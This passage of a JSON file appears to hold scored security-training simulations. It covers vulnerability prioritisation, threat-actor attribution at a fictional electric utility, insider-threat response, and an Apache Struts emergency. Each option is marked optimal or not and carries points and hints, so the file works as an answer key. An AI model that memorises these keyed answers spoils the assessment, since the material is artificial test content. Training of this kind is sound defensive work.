            "feedback": "{'short': \"Unnecessary work if vulnerability doesn't exist\", 'detailed': \"If the system is already on a patched version (2.4.52 vs vulnerable 2.4.49), there's nothing to patch - the vulnerability doesn't exist on this system. Treating false positives as real wastes resources and can cause unnecessary downtime. Validate first, then act.\", 'consequence': 'Unnecessary change management, potential downtime for non-existent vulnerability.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Remove the scanner - too many false positives means it's not useful",
            "feedback": "{'short': \"One false positive doesn't invalidate the tool\", 'detailed': \"All scanners produce some false positives - that's normal. The appropriate response is to validate findings and tune the scanner, not abandon it. One false positive doesn't mean the scanner is useless. Vulnerability scanning with validation is far better than no scanning.\", 'consequence': 'Losing visibility into actual vulnerabilities.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What's the proper process when you suspect a finding is incorrect?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Validate \u00e2\u2020\u2019 Verify \u00e2\u2020\u2019 Document. Confirm actual system state, gather evidence, document decision with reasoning."
          }
        ]
      },
      {
        "id": "decision_10",
        "sequence": 10,
        "title": "Comprehensive Prioritization",
        "situation": "Marcus presents a final challenge with four vulnerabilities. Prioritize them:\n\nA: CVSS 9.8, internet-facing web app, Metasploit module available\nB: CVSS 10.0, isolated test server, no network connectivity, no exploit known\nC: CVSS 7.5, internal HR system with PII, PoC exploit on GitHub\nD: CVSS 6.5, internet-facing marketing site, actively being exploited per CISA KEV\n\n**Question:** What is the correct priority order from highest to lowest?",
        "options": [
          {
            "id": "A",
            "text": "B \u00e2\u2020\u2019 A \u00e2\u2020\u2019 C \u00e2\u2020\u2019 D (ordered by CVSS score)",
            "feedback": "{'short': \"CVSS alone doesn't determine priority\", 'detailed': 'CVSS 10.0 sounds scary, but on an isolated test server with no network connectivity? Extremely low actual risk - no attacker can reach it. Meanwhile, D is actively being exploited but would be lowest priority by CVSS. Risk-based prioritization considers exposure, exploit status, and asset value - not just CVSS.', 'consequence': 'Addressing low-risk systems while active attacks continue on exposed systems.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "D \u00e2\u2020\u2019 A \u00e2\u2020\u2019 C \u00e2\u2020\u2019 B (active exploitation first, then exposure and asset value)",
            "feedback": "{'short': 'Correct! Active exploitation trumps theoretical severity', 'detailed': 'Correct priority: D first (ACTIVELY exploited per CISA KEV - attacks happening NOW despite lower CVSS), A second (internet-facing + weaponized Metasploit = imminent threat), C third (internal but has PII + PoC exists = real risk), B last (isolated, no connectivity, no exploit = theoretical only). Real risk trumps theoretical severity.', 'consequence': 'Resources focused on actual threats in priority order.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "A \u00e2\u2020\u2019 D \u00e2\u2020\u2019 B \u00e2\u2020\u2019 C (internet-facing first)",
            "feedback": "{'short': 'Active exploitation should trump potential exploitation', 'detailed': 'Internet exposure matters, but D is ACTIVELY BEING EXPLOITED per CISA KEV - meaning attacks are happening right now. A has a Metasploit module (could be exploited easily) but D has confirmed active attacks. Active exploitation always takes priority over potential exploitation.', 'consequence': 'Addressing potential threats before confirmed active attacks.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "C \u00e2\u2020\u2019 A \u00e2\u2020\u2019 D \u00e2\u2020\u2019 B (PII data sensitivity first)",
            "feedback": "{'short': 'Data sensitivity matters but active exploitation is more urgent', 'detailed': 'PII is important to protect, but the HR system is internal with only a PoC (not weaponized, not actively exploited). D is actively being exploited NOW on an internet-facing system. Urgency of active attacks exceeds the sensitivity calculation for the internal system.', 'consequence': 'Active attacks continue while addressing internal theoretical risk.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What vulnerability status represents the most immediate threat? Hint: 'actively being exploited' means attacks are happening NOW."
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Priority order: Active exploitation (CISA KEV) > Weaponized + Exposed > PoC + Sensitive data > Theoretical + Isolated."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D2-SIM-001",
    "title": "The Attribution Puzzle",
    "domain": 2,
    "type": "SIM",
    "difficulty": "intermediate",
    "time_estimate": "35-45 minutes",
    "role": "soc_analyst",
    "organization": {
      "name": "Meridian Energy Corporation",
      "industry": "Critical Infrastructure - Electric Utility",
      "size": "2,800 employees, serves 1.2 million customers across 3 states"
    },
    "introduction": "Welcome to The Attribution Puzzle. You will make critical security decisions.",
    "learning_objectives": [
      "2.1",
      "2.2",
      "2.4"
    ],
    "decision_points": [
      {
        "id": "D2S1-DP-001",
        "sequence": 1,
        "title": "Cluster A Attribution",
        "situation": "You begin analyzing Cluster A - the port scanning and vulnerability probing from TOR exit nodes using known public exploits.\n\n**Question:** Based on the indicators, what threat actor type is MOST likely responsible for Cluster A?",
        "options": [
          {
            "id": "A",
            "text": "Nation-state APT conducting initial reconnaissance",
            "feedback": "Nation-state actors typically conduct reconnaissance more stealthily. Using TOR exit nodes for noisy port scans and known public exploits doesn't match APT sophistication. They prefer custom tools and avoid detection, not broadcast their presence.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Script kiddies or automated scanning tools - opportunistic, unsophisticated",
            "feedback": "Correct! The indicators point to low-sophistication actors: TOR for anonymity (common for amateurs), automated vulnerability scanning, known public exploits, no successful intrusions. This is typical opportunistic scanning that hits every internet-facing organization. Low priority but worth monitoring.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Cybercriminal group probing for ransomware deployment",
            "feedback": "Sophisticated cybercriminal groups typically have more targeted initial access methods (phishing, purchased credentials, specific vulnerability exploitation). Mass scanning from TOR with public exploits is more consistent with unskilled actors or automated scanning services.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "The GreenGrid Collective hacktivists conducting reconnaissance",
            "feedback": "GreenGrid's activity (Cluster C) is separate and they announced their DDoS attack publicly. Hacktivists typically take credit for their actions. This scanning cluster shows no connection to the hacktivist campaign and is more consistent with general opportunistic scanning.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Consider the sophistication level: known public exploits, TOR exit nodes, noisy scanning. What actor type matches this?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Script kiddies and automated tools produce noisy, unsophisticated scanning. APTs are stealthy. Criminals are targeted.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D2S1-DP-002",
        "sequence": 2,
        "title": "Cluster B Attribution",
        "situation": "You analyze Cluster B - the spearphishing campaign with custom malware targeting executives. The malware has zero AV detections and uses sophisticated C2 infrastructure.\n\n**Question:** Based on the indicators, what threat actor type is MOST likely responsible for Cluster B?",
        "options": [
          {
            "id": "A",
            "text": "Nation-state APT - sophisticated, targeted, matches CISA advisory",
            "feedback": "Excellent analysis! Key indicators: spearphishing executives with industry-specific lures, custom malware with zero AV detection, C2 mimicking legitimate services, obfuscated PowerShell - all match the CISA advisory TTPs for state-sponsored actors targeting energy sector. This is your highest priority threat.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Sophisticated cybercriminal group preparing ransomware attack",
            "feedback": "Cybercriminals capable of custom malware exist, but the targeting pattern (executives, industry-specific lures, SCADA interest) and correlation with CISA advisory suggest state-sponsored activity. Criminals typically want fast monetization, not infrastructure reconnaissance.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Advanced hacktivist group with nation-state backing",
            "feedback": "GreenGrid Collective (active hacktivists in this scenario) doesn't demonstrate this level of sophistication. While some hacktivist groups have evolved, the indicators here match pure APT activity - long-term access, infrastructure reconnaissance, no public statements.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Insider threat - someone provided access to attackers",
            "feedback": "While insiders can facilitate attacks, the indicators describe external spearphishing - executives received emails they clicked. The sophistication is in the external attacker's tools, not insider knowledge. The attack came from outside.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Compare the TTPs to the CISA advisory. What matches?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Custom malware, zero AV detection, industry lures, C2 mimicry, PowerShell - these are APT hallmarks. The advisory warns of exactly this.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D2S1-DP-003",
        "sequence": 3,
        "title": "Cluster C Attribution",
        "situation": "You review Cluster C - the DDoS attack and defacement attempt accompanied by social media claims from 'GreenGrid Collective.'\n\n**Question:** Based on the indicators, what threat actor type and motivation is MOST likely for Cluster C?",
        "options": [
          {
            "id": "A",
            "text": "Hacktivists motivated by environmental ideology",
            "feedback": "Correct! Clear hacktivist indicators: public announcement of attack, ideological messaging ('profits from destroying the planet'), DDoS and defacement (typical hacktivist tactics), known group with history of similar attacks. Motivation is making a political/environmental statement, not financial gain or espionage.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Cybercriminals using environmental messaging as cover",
            "feedback": "Cybercriminals focus on monetization. DDoS with defacement and public statements doesn't generate revenue. GreenGrid has a documented history of environmental activism. The messaging is consistent with their ideology, not a cover for profit-seeking.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Nation-state conducting distracting attack while APT operates",
            "feedback": "Interesting theory, but GreenGrid Collective is a known independent hacktivist group with consistent ideology. While the timing is notable (APT and hacktivists active simultaneously), there's no evidence of coordination. Sometimes multiple threats occur independently.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Competitor engaging in corporate sabotage",
            "feedback": "Competitors typically don't conduct public DDoS attacks with environmental messaging - that would expose them to legal liability and reputational damage. This pattern is consistent with genuine ideological hacktivism.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Public announcement, ideological messaging, DDoS/defacement - what actor type seeks publicity for a cause?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Hacktivists: ideological motivation, public statements, disruptive (not destructive) tactics, seeking attention for cause.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D2S1-DP-004",
        "sequence": 4,
        "title": "Cluster D Attribution",
        "situation": "You analyze Cluster D - the internal user accessing engineering documents at unusual hours and downloading to USB. The user has a grievance with the company.\n\n**Question:** Based on the indicators, what threat actor type is MOST likely for Cluster D?",
        "options": [
          {
            "id": "A",
            "text": "Insider threat - disgruntled employee potentially preparing to leave or cause harm",
            "feedback": "Correct! Classic insider threat indicators: legitimate user with authorized access, unusual access times (2:47 AM for day shift worker), bulk data download to removable media, recent grievance/dissatisfaction, job searching behavior. The access is legitimate but the pattern is suspicious.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Compromised account being used by external attacker",
            "feedback": "Account compromise is possible, but the behavioral indicators (grievance, job searching, promotion denial) suggest the actual employee. External attackers using compromised accounts typically don't have the contextual knowledge to access specific engineering documents relevant to the user's job role.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Nation-state using an insider recruit for access",
            "feedback": "While nation-states do recruit insiders, there's no evidence of foreign contact or recruitment. The simpler explanation fits: a disgruntled employee with grievances acting on their own. The documents accessed relate to his job function, not strategic intelligence targets.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Normal work activity - technicians sometimes work odd hours",
            "feedback": "The combination of factors is too suspicious to dismiss: 2:47 AM access for someone who works 7am-3pm, bulk download to USB (against policy), recent grievance, and job searching. Any one factor might be explainable; together they indicate a problem.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Legitimate access + unusual behavior + grievance + data exfiltration. What threat type has legitimate access?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Insider threats use their legitimate access in unauthorized ways. Watch for behavioral changes, grievances, and data staging.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D2S1-DP-005",
        "sequence": 5,
        "title": "Threat Prioritization",
        "situation": "You've attributed all four threat clusters. Now you need to prioritize response. Resources are limited - you can't address everything with equal intensity.\n\n**Question:** How should you PRIORITIZE these threats for response?",
        "options": [
          {
            "id": "A",
            "text": "Cluster C (Hacktivists) first - they're actively attacking and public",
            "feedback": "Hacktivists are disruptive but typically limited in capability and impact. DDoS and defacement are annoying but recoverable. The APT (Cluster B) and insider (Cluster D) pose greater risks to critical infrastructure and sensitive data. Visibility shouldn't determine priority.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Cluster B (APT) first, then Cluster D (Insider), then C (Hacktivists), then A (Script kiddies)",
            "feedback": "Excellent prioritization! APT is highest risk - sophisticated, targeting critical infrastructure, potential for long-term damage. Insider has legitimate access to sensitive systems - immediate risk of data theft. Hacktivists are disruptive but limited. Script kiddies are background noise handled by standard controls.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Cluster D (Insider) first - they have direct access to SCADA systems",
            "feedback": "Good thinking about insider access, but the APT is specifically targeting SCADA reconnaissance and has already achieved initial access (exec clicked phishing). The APT's ultimate goal may be the same systems, with more sophisticated capabilities. APT slightly edges out insider for priority.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "All threats equally - address them simultaneously",
            "feedback": "Resource constraints make equal treatment impractical. More importantly, threats have genuinely different risk levels. APT capabilities far exceed script kiddies. Prioritization ensures the highest risks get the best resources. Equal treatment wastes resources on low-priority threats.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Consider capability (what can they do?), intent (what do they want?), and access (how close are they to achieving it?).",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "APT: high capability, persistent, already achieved initial access. Insider: legitimate access, immediate threat. Hacktivists: limited capability. Script kiddies: nuisance.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D2S1-DP-006",
        "sequence": 6,
        "title": "APT Attack Vector Analysis",
        "situation": "Focusing on the APT threat, you need to understand their attack vectors to prevent further intrusion.\n\n**Question:** What was the PRIMARY attack vector used by the APT in Cluster B?",
        "options": [
          {
            "id": "A",
            "text": "Exploit of unpatched vulnerability",
            "feedback": "The SIEM data shows spearphishing emails as the initial vector, not technical exploitation. While APTs can use exploits, this campaign targeted executives via social engineering with industry-specific lures. The malware was delivered via email, not vulnerability exploitation.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Spearphishing with malicious attachments/links targeting specific executives",
            "feedback": "Correct! The attack vector was spearphishing - targeted phishing aimed at specific high-value individuals (executives). The lures were industry-specific (fake NERC compliance docs), showing reconnaissance on targets. This is a classic APT initial access technique leveraging human factors.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Compromised supply chain software",
            "feedback": "Supply chain attacks are sophisticated APT techniques, but this incident shows direct spearphishing to executives. There's no indication of compromised vendor software. The attack vector was email-based social engineering.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Watering hole attack on industry website",
            "feedback": "Watering hole attacks compromise websites visited by targets. This incident shows direct email delivery to executives with custom malware. The vector was spearphishing, not compromised websites.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "How did the malware reach the executives? What does the SIEM data say about delivery method?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Spearphishing = targeted phishing with researched lures. The industry-specific docs (NERC compliance) show targeting.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D2S1-DP-007",
        "sequence": 7,
        "title": "APT Motivation Analysis",
        "situation": "Understanding APT motivation helps predict their next moves and ultimate objectives.\n\n**Question:** Based on the indicators and threat intelligence, what is the MOST likely APT motivation?",
        "options": [
          {
            "id": "A",
            "text": "Financial gain through ransomware deployment",
            "feedback": "Nation-state APTs targeting critical infrastructure typically seek strategic advantage, not immediate financial gain. The targeting of SCADA/ICS systems suggests infrastructure disruption capability, not ransomware deployment. The CISA advisory also indicates espionage/disruption motives.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Espionage and pre-positioning for potential infrastructure disruption",
            "feedback": "Correct! Nation-state APTs targeting energy infrastructure typically have dual goals: intelligence gathering (understanding grid architecture, vulnerabilities) and pre-positioning (establishing access for potential future disruption during conflict). The CISA advisory warns of exactly this pattern.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Hacktivism supporting environmental causes",
            "feedback": "APT actors don't share hacktivist motivations. The sophistication level (custom malware, operational security) far exceeds hacktivist capabilities. This is state-sponsored activity, not ideological activism.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Industrial espionage to steal proprietary technology",
            "feedback": "While APTs do conduct industrial espionage, utility companies typically don't have cutting-edge proprietary technology that foreign nations want. The focus on grid topology and SCADA suggests infrastructure targeting, not technology theft. Energy sector targeting is usually strategic, not commercial.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Why would a nation-state target a power utility? What strategic value does grid access provide?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Critical infrastructure targeting = potential for disruption during geopolitical conflict. Pre-positioning establishes access for future use.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D2S1-DP-008",
        "sequence": 8,
        "title": "Indicator of Compromise Analysis",
        "situation": "You need to identify indicators of compromise (IOCs) from the APT activity to detect any additional compromised systems.\n\n**Question:** Which IOC type would be MOST effective for hunting for additional APT compromise in your environment?",
        "options": [
          {
            "id": "A",
            "text": "IP addresses of the C2 servers",
            "feedback": "C2 IPs are useful but sophisticated APTs frequently rotate infrastructure. The IP you know may already be abandoned. Behavioral IOCs (TTPs) are more durable for sophisticated threats than network IOCs which change rapidly.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Behavioral indicators - obfuscated PowerShell patterns, scheduled task persistence, cloud service mimicry",
            "feedback": "Excellent! Behavioral indicators (TTPs - Tactics, Techniques, Procedures) are most effective against sophisticated actors. APTs change IPs and malware hashes but reuse techniques. Hunting for obfuscated PowerShell, suspicious scheduled tasks, and unusual cloud service connections catches TTP patterns.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "File hashes of the custom malware",
            "feedback": "The malware is already custom with zero AV detections - the hash is unique. APTs generate unique samples per target, making hash-based detection ineffective. Hash IOCs work for commodity malware, not custom APT tools.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Email sender addresses from the phishing campaign",
            "feedback": "Phishing sender addresses are easily spoofed or changed. APTs use different sending infrastructure for each campaign. Email IOCs from this campaign are unlikely to match future campaigns from the same actor.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Sophisticated actors change IPs, hashes, and domains frequently. What's harder to change?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "TTPs (Tactics, Techniques, Procedures) are behavioral patterns. Actors reuse techniques even when they change infrastructure.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D2S1-DP-009",
        "sequence": 9,
        "title": "Insider Threat Response",
        "situation": "Turning to the insider threat, you need to recommend immediate actions. The employee still has active access to systems.\n\n**Question:** What is the MOST appropriate immediate response for the insider threat situation?",
        "options": [
          {
            "id": "A",
            "text": "Immediately terminate employment and revoke all access",
            "feedback": "Immediate termination without investigation may be premature and could complicate legal proceedings. You don't have proof of malicious intent yet - the activity is suspicious but could have explanations. Work with HR and Legal to determine appropriate action.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Increase monitoring of the employee's activities while coordinating with HR and Legal for proper investigation",
            "feedback": "Correct! Enhanced monitoring allows gathering evidence while coordinating with HR and Legal ensures proper handling. This preserves legal options, allows investigation, and maintains business continuity. You can restrict sensitive access while investigating without full termination.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Confront the employee directly and ask for explanation",
            "feedback": "Direct confrontation by security without HR involvement can create hostile work environment claims and may tip off the employee to destroy evidence. Insider threat investigations require careful coordination with HR, Legal, and management.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Ignore it - the employee has legitimate access to those documents",
            "feedback": "The combination of suspicious indicators (unusual hours, bulk USB download, grievance, job searching) requires investigation. Legitimate access doesn't mean legitimate use. Ignoring clear warning signs of potential insider threat is negligent.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Insider threat response requires balancing security, legal considerations, and employee rights. Who should be involved?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Enhanced monitoring + HR/Legal coordination allows proper investigation while protecting the organization and preserving evidence.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D2S1-DP-010",
        "sequence": 10,
        "title": "Threat Intelligence Sharing",
        "situation": "You've analyzed all threats. Leadership asks about sharing this intelligence with external parties.\n\n**Question:** With whom should Meridian share threat intelligence about the APT campaign?",
        "options": [
          {
            "id": "A",
            "text": "Share with no one - this information is sensitive and proprietary",
            "feedback": "While caution is appropriate, refusing all sharing misses opportunities for collective defense. ISACs and government agencies can help and protect other potential victims. Intelligence sharing with appropriate parties strengthens the entire sector.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Share full details publicly on social media to warn everyone",
            "feedback": "Public disclosure could tip off the threat actor, potentially endanger other victims, and may violate disclosure agreements. Threat intelligence sharing should go through appropriate channels (ISACs, government) with proper handling designations.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Share with E-ISAC (Electricity ISAC), CISA, and peer utilities through established sharing channels",
            "feedback": "Excellent! Sector ISACs (E-ISAC for electricity) and CISA are appropriate sharing partners. They can correlate with other incidents, provide additional intelligence, and help protect other potential victims. Use TLP (Traffic Light Protocol) designations to control further dissemination.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Only share with law enforcement for potential prosecution",
            "feedback": "Law enforcement involvement is appropriate for serious incidents, but limiting sharing to only law enforcement misses the defensive benefit of sector sharing. E-ISAC and CISA help protect others; law enforcement focuses on investigation/prosecution. Both have value.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "What organizations exist specifically for sharing threat intelligence in the energy sector?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "ISACs (Information Sharing and Analysis Centers) enable sector-specific sharing. E-ISAC serves electricity. CISA coordinates nationally.",
            "penalty": 5
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D2-SIM-002",
    "title": "Vulnerability Management Crisis",
    "domain": 2,
    "type": "SIM",
    "difficulty": "intermediate",
    "time_estimate": "45-60 minutes",
    "role": "Senior Vulnerability Analyst",
    "organization": {
      "name": "TechBazaar",
      "industry": "E-commerce"
    },
    "introduction": "It's 4:47 PM on Friday when CISA issues an emergency directive: a critical remote code execution vulnerability in Apache Struts has been discovered with active exploitation in the wild. CVE-2024-XXXX has a CVSS score of 10.0. Your initial asset scan shows 847 systems running Apache Struts across web application servers, middleware, and legacy integration systems. The business is preparing for the biggest shopping weekend of the year, and leadership is already pushing back on any downtime. Your vulnerability management program is about to face its biggest test.",
    "learning_objectives": [
      "Explain various types of vulnerabilities",
      "Explain the purpose of mitigation techniques used to secure the enterprise"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Initial Vulnerability Assessment",
        "situation": "You've received the CISA alert about the Apache Struts vulnerability. Your first task is to understand your exposure. You have access to both Tenable.io and Qualys scanning platforms.\n\n**Question:** What is your FIRST priority in assessing your organization's exposure?",
        "options": [
          {
            "id": "A",
            "text": "Run a new credentialed vulnerability scan across all 12,500 assets to detect the vulnerability",
            "feedback": "{'short': 'Too slow for emergency response', 'detailed': 'A full credentialed scan across 12,500 assets takes 8-12 hours. In a zero-day situation with active exploitation, you need faster visibility. Better approaches include querying existing asset inventory for known Struts installations or running targeted scans against likely affected systems.', 'consequence': 'You wait 10+ hours for scan results while the vulnerability is actively exploited in the wild.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Query your asset inventory and software management tools to identify systems running Apache Struts",
            "feedback": "{'short': 'Excellent! Inventory queries provide fastest visibility', 'detailed': \"Asset inventory and software management tools (CMDB, software inventory agents) can provide near-instant results for 'which systems have Struts installed.' This gives you a scope estimate within minutes rather than hours. You can then prioritize targeted vulnerability scans on the identified systems to confirm versions and exposure.\", 'consequence': 'Within 30 minutes, you have a list of 847 potentially affected systems and can begin prioritization.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Start patching immediately - patch everything and ask questions later",
            "feedback": "{'short': 'Dangerous without assessment', 'detailed': \"Patching without assessment leads to uncontrolled changes, potential service disruptions, and incomplete remediation. You might patch non-critical systems while leaving critical ones exposed. You also don't know if the patch will cause application issues. Assessment before action is essential.\", 'consequence': 'Uncoordinated patching causes service outages in production while critical systems remain unpatched.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Wait for your vulnerability scanner vendor to release detection signatures before assessing",
            "feedback": "{'short': 'Too passive for a critical zero-day', 'detailed': \"Vendors typically release signatures within 24-48 hours of disclosure, but with active exploitation, you can't wait. Use available information (affected versions from the advisory) and existing inventory data to begin assessment immediately. Scanner signatures can validate findings later.\", 'consequence': '24-48 hour delay while attackers actively exploit the vulnerability.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "In an emergency, what existing data sources could tell you which systems have the affected software installed?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Asset inventory databases, CMDBs, and software management agents can identify installed software faster than new vulnerability scans."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "Understanding CVSS 10.0",
        "situation": "Your CISO asks you to explain why this vulnerability is rated CVSS 10.0 and what makes it so critical. The score vector is: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\n\n**Question:** Which combination of factors makes this vulnerability receive the maximum CVSS score?",
        "options": [
          {
            "id": "A",
            "text": "It requires physical access, but once accessed, it provides complete system control",
            "feedback": "{'short': 'Incorrect - physical access would lower the score', 'detailed': 'Physical access (AV:P) is the MOST restrictive attack vector, significantly lowering CVSS scores. This vulnerability has AV:N (Network), meaning it can be exploited remotely over the network, which is the HIGHEST risk attack vector.', 'consequence': 'Misunderstanding CVSS vectors leads to incorrect risk prioritization.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Network exploitable, no authentication needed, no user interaction, complete system compromise",
            "feedback": "{'short': 'Correct! This is a perfect storm vulnerability', 'detailed': \"CVSS 10.0 requires the worst case in every metric: Network accessible (AV:N) - exploitable from anywhere; Low complexity (AC:L) - easy to exploit; No privileges required (PR:N) - no authentication needed; No user interaction (UI:N) - victim doesn't need to click anything; Changed scope (S:C) - can affect other systems; High impact to confidentiality, integrity, and availability (C:H/I:H/A:H). This is as bad as it gets.\", 'consequence': 'Accurate understanding enables proper prioritization and executive communication.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "It affects high-value targets even though exploitation is complex",
            "feedback": "{'short': \"CVSS doesn't consider target value\", 'detailed': \"CVSS base scores don't consider WHAT systems are affected - only HOW the vulnerability can be exploited. Attack Complexity (AC:L in this case) means exploitation is EASY, not complex. Environmental scoring can add context about specific assets, but that's separate from the base score.\", 'consequence': 'Conflating base and environmental scores leads to inconsistent risk assessment.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
